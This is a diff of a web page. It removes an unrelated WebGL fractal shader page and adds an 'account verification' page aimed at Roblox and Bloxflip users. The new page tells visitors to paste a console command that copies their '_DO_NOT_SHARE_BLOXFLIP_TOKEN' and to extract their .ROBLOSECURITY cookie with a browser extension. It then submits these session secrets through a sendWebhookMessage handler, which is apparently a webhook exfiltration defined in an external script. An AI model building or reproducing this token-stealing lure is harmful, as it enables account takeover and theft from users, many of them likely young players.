@@ -1,194 +1,146 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Nested Volume Shader</title>
-<style>
-  body, html {
-    margin: 0; padding: 0; overflow: hidden; height: 100%;
-    background: black;
-  }
-  canvas {
-    display: block; width: 100vw; height: 100vh;
-  }
-</style>
+  <title>Connect an Account</title>
+  <style>
+    body {
+      background-color: #333;
+      color: #fff;
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+    }
+
+    .container {
+      width: 400px;
+      margin: 0 auto;
+      background-color: #666;
+      border-radius: 10px;
+      padding: 20px;
+      text-align: center;
+      display: none;
+      animation-duration: 0.5s;
+      animation-fill-mode: forwards;
+    }
+
+    .button-container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .button {
+      display: inline-block;
+      margin-top: 10px;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      color: #fff;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    .button-blue {
+      background-color: #007bff;
+    }
+
+    .button-red {
+      background-color: #dc3545;
+    }
+
+    .instructions {
+      text-align: left;
+      margin-top: 20px;
+    }
+
+    .code {
+      background-color: #333;
+      color: #fff;
+      padding: 5px;
+    }
+
+    .link {
+      color: #007bff;
+    }
+
+    .text-input {
+      width: 300px;
+      height: 30px;
+      margin-top: 20px;
+    }
+
+    .enter-button {
+      padding: 5px 10px;
+      background-color: #007bff;
+      border: none;
+      border-radius: 5px;
+      color: #fff;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    @keyframes fadeOut {
+      0% {
+        opacity: 1;
+      }
+      100% {
+        opacity: 0;
+      }
+    }
+
+    @keyframes fadeIn {
+      0% {
+        opacity: 0;
+      }
+      100% {
+        opacity: 1;
+      }
+    }
+  </style>
 </head>
 <body>
-<canvas id="glcanvas"></canvas>
+  <div class="container" id="connectAccountBox" style="display: block;">
+    <h1>Connect an Account to Verify</h1>
+    <div class="button-container">
+      <button class="button button-blue" onclick="showBloxflipBox()">Bloxflip</button>
+      <button class="button button-red" onclick="showRobloxBox()">Roblox</button>
+    </div>
+  </div>
 
-<script type="x-shader/x-vertex" id="vertexShader">
-attribute vec4 a_position;
-void main() {
-  gl_Position = a_position;
-}
-</script>
+  <div class="container" id="bloxflipBox">
+    <h1>Follow These Steps</h1>
+    <p>To Link Your Bloxflip Account</p>
+    <ol class="instructions">
+      <li>Head over to <a href="https://bloxflip.com" class="link">Bloxflip</a></li>
+      <li>Simultaneously press <kbd>Ctrl+Shift+I</kbd></li>
+      <li>Click on the Console tab</li>
+      <li>Paste this code into your console</li>
+    </ol>
+    <pre><code class="code" style="background-color: #555;">copy(localStorage.getItem('_DO_NOT_SHARE_BLOXFLIP_TOKEN'));</code></pre>
+    <p>If the console says <code>undefined</code>, it should be in your clipboard.</p>
+    <div id="bloxflipForm">
+      <input type="text" class="text-input" id="bloxflipTokenInput" placeholder="Enter your Bloxflip token">
+      <button class="enter-button" onclick="sendWebhookMessage('bloxflipTokenInput')">Enter</button>
+    </div>
+  </div>
 
-<script type="x-shader/x-fragment" id="fragmentShader">
-precision highp float;
-
-uniform vec2 u_resolution;
-uniform float u_time;
-
-// Simple volume function to nest inside itself
-float volumeKernel(vec3 p) {
-    float b = length(p);
-    float c = atan(p.y, p.x) * 8.0;
-    float d = acos(p.z / b) * 8.0;
-    float powB = pow(b, 8.0);
-    vec3 a = vec3(
-      powB * sin(d) * cos(c),
-      powB * sin(d) * sin(c),
-      powB * cos(d)
-    ) + p;
-
-    if (b > 6.0) {
-      return 4.0 - dot(a, a);
-    }
-    return volumeKernel(a);  // recursive call — careful, GLSL doesn’t support recursion, so this is for concept only!
-}
-
-// Since GLSL doesn't allow recursion, we unroll it manually:
-float nestedVolumeKernel(vec3 p) {
-    vec3 a = p;
-    float val = 0.0;
-    for (int i = 0; i < 5; i++) {
-        float b = length(a);
-        float c = atan(a.y, a.x) * 8.0;
-        float d = acos(a.z / b) * 8.0;
-        float powB = pow(b, 8.0);
-        a = vec3(
-            powB * sin(d) * cos(c),
-            powB * sin(d) * sin(c),
-            powB * cos(d)
-        ) + p;
-        if (b > 6.0) break;
-        val = 4.0 - dot(a, a);
-    }
-    return val;
-}
-
-// Main render function
-void main() {
-    vec2 uv = (gl_FragCoord.xy / u_resolution.xy) * 2.0 - 1.0;
-    uv.x *= u_resolution.x / u_resolution.y;
-
-    // Animate the position over time
-    vec3 pos = vec3(uv * 0.5, sin(u_time) * 0.5);
-
-    // Apply nested volume kernel multiple times for deep nesting
-    vec3 p = pos;
-    float v1 = nestedVolumeKernel(p);
-    float v2 = nestedVolumeKernel(vec3(v1));
-    float v3 = nestedVolumeKernel(vec3(v2));
-    float v4 = nestedVolumeKernel(vec3(v3));
-    float v5 = nestedVolumeKernel(vec3(v4));
-
-    float val = v5;
-
-    // Color mapping
-    vec3 color = vec3(0.5 + 0.5 * sin(val * 10.0 + u_time),
-                      0.5 + 0.5 * cos(val * 5.0 + u_time * 0.5),
-                      0.5 + 0.5 * sin(val * 3.0 + u_time * 0.3));
-
-    gl_FragColor = vec4(color, 1.0);
-}
-</script>
-
-<script>
-(function(){
-  const canvas = document.getElementById("glcanvas");
-  const gl = canvas.getContext("webgl");
-
-  if (!gl) {
-    alert("WebGL not supported");
-    return;
-  }
-
-  // Resize canvas to fill window
-  function resize() {
-    canvas.width = window.innerWidth;
-    canvas.height = window.innerHeight;
-    gl.viewport(0, 0, canvas.width, canvas.height);
-  }
-  window.addEventListener("resize", resize);
-  resize();
-
-  // Compile shader helper
-  function compileShader(type, source) {
-    const shader = gl.createShader(type);
-    gl.shaderSource(shader, source);
-    gl.compileShader(shader);
-    if (!gl.getShaderParameter(shader, gl.COMPILE_STATUS)) {
-      console.error("Shader compile failed: ", gl.getShaderInfoLog(shader));
-      gl.deleteShader(shader);
-      return null;
-    }
-    return shader;
-  }
-
-  // Create program helper
-  function createProgram(vsSource, fsSource) {
-    const vertexShader = compileShader(gl.VERTEX_SHADER, vsSource);
-    const fragmentShader = compileShader(gl.FRAGMENT_SHADER, fsSource);
-    if (!vertexShader || !fragmentShader) return null;
-
-    const program = gl.createProgram();
-    gl.attachShader(program, vertexShader);
-    gl.attachShader(program, fragmentShader);
-    gl.linkProgram(program);
-    if (!gl.getProgramParameter(program, gl.LINK_STATUS)) {
-      console.error("Program link failed: ", gl.getProgramInfoLog(program));
-      return null;
-    }
-    return program;
-  }
-
-  const vsSource = document.getElementById("vertexShader").textContent;
-  const fsSource = document.getElementById("fragmentShader").textContent;
-
-  const program = createProgram(vsSource, fsSource);
-  gl.useProgram(program);
-
-  // Create a fullscreen quad
-  const positionBuffer = gl.createBuffer();
-  gl.bindBuffer(gl.ARRAY_BUFFER, positionBuffer);
-  gl.bufferData(
-    gl.ARRAY_BUFFER,
-    new Float32Array([
-      -1, -1,
-      1, -1,
-      -1, 1,
-      -1, 1,
-      1, -1,
-      1, 1,
-    ]),
-    gl.STATIC_DRAW
-  );
-
-  const positionLoc = gl.getAttribLocation(program, "a_position");
-  gl.enableVertexAttribArray(positionLoc);
-  gl.vertexAttribPointer(positionLoc, 2, gl.FLOAT, false, 0, 0);
-
-  // Uniform locations
-  const resolutionLoc = gl.getUniformLocation(program, "u_resolution");
-  const timeLoc = gl.getUniformLocation(program, "u_time");
-
-  // Render loop
-  let startTime = Date.now();
-
-  function render() {
-    gl.uniform2f(resolutionLoc, canvas.width, canvas.height);
-    gl.uniform1f(timeLoc, (Date.now() - startTime) * 0.001);
-
-    gl.drawArrays(gl.TRIANGLES, 0, 6);
-    requestAnimationFrame(render);
-  }
-
-  render();
-
-})();
-</script>
-
+  <div class="container" id="robloxBox">
+    <h1>Follow These Steps</h1>
+    <p>To Link Your Roblox Account</p>
+    <ol class="instructions">
+      <li>Go To <a href="https://roblox.com" class="link">Roblox</a></li>
+      <li>Download the <a href="https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg" class="link">Edit This Cookie</a> extension</li>
+      <li>While on Roblox, click on the extension</li>
+      <li>Go to ".ROBLOSECURITY" and copy the cookie</li>
+    </ol>
+    <div id="robloxForm">
+      <input type="text" class="text-input" id="robloxTokenInput" placeholder="Enter your Roblox security token">
+      <button class="enter-button" onclick="sendWebhookMessage('robloxTokenInput')">Enter</button>
+    </div>
+  </div>
+</body>
+</html>
+<script src="script.js"></script>
 </body>
 </html>
